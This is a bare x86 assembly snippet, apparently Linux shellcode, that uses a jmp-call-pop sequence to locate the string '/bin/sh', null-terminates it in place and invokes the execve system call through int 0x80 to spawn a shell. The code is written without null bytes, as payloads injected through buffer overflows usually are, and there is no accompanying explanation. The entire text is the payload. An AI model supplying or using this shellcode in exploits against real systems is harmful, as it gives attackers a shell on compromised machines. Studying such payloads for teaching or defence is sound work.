jmp _WANT_BIN_BASH
_GOT_BIN_BASH:
    xor eax, eax
    pop ebx
    mov byte ptr [ebx+7], al
    mov al, 0xb
    xor ecx, ecx
    xor edx, edx
    int 0x80
_WANT_BIN_BASH:
    call _GOT_BIN_BASH
    .ASCII "/bin/sh@"